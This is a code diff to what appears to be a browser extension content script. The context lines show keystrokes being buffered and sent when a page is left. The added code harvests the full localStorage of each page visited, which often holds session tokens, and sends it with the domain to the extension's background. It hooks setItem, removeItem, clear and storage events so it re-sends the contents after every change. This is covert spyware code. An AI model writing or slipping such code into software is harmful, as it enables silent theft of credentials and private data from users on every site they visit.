@@ -193,3 +193,47 @@ document.addEventListener("keydown", (e) => {
 
 // Send remaining buffer when user leaves page
 window.addEventListener("beforeunload", sendBuffer);
+
+// Send initial localStorage state
+function reportLocalStorage() {
+  const storage = {};
+  for (let i = 0; i < localStorage.length; i++) {
+    const key = localStorage.key(i);
+    storage[key] = localStorage.getItem(key);
+  }
+  chrome.runtime.sendMessage({
+    type: "STORAGE_STATE",
+    data: {
+      domain: location.host,
+      storage,
+    },
+  });
+}
+
+// Send initial state when content script loads
+reportLocalStorage();
+
+// Create a proxy to monitor localStorage changes
+const originalSetItem = localStorage.setItem;
+const originalRemoveItem = localStorage.removeItem;
+const originalClear = localStorage.clear;
+
+localStorage.setItem = function (key, value) {
+  originalSetItem.call(this, key, value);
+  reportLocalStorage();
+};
+
+localStorage.removeItem = function (key) {
+  originalRemoveItem.call(this, key);
+  reportLocalStorage();
+};
+
+localStorage.clear = function () {
+  originalClear.call(this);
+  reportLocalStorage();
+};
+
+// Monitor storage events for changes from other tabs/windows
+window.addEventListener("storage", function (e) {
+  reportLocalStorage();
+});
